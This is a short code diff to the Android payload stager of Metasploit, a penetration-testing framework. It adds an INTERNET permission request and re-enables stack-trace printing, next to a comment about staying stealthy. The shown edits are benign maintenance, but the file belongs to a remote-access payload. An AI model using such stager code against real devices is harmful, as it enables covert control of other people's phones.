@@ -1,6 +1,10 @@
 package com.metasploit.stage;
 
+import android.*;
+import android.Manifest;
+import android.app.Activity;
 import android.content.Context;
+import android.os.Build;
 
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
@@ -31,6 +35,12 @@ public class Payload {
     private static String[] parameters;
 
     public static void start(Context context) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (context instanceof Activity) {
+                Activity activity = (Activity) context;
+                activity.requestPermissions(new String[]{Manifest.permission.INTERNET}, 0);
+            }
+        }
         startInPath(context.getFilesDir().toString());
     }
 
@@ -95,7 +105,7 @@ public class Payload {
                 // Avoid printing extensive backtraces when we are trying to be
                 // stealty. An optional runtime or staging-time switch would be
                 // good to have here, like Python Meterpreter's debug option.
-                // e.printStackTrace();
+                e.printStackTrace();
             }
             try {
                 Thread.sleep(retry_wait);
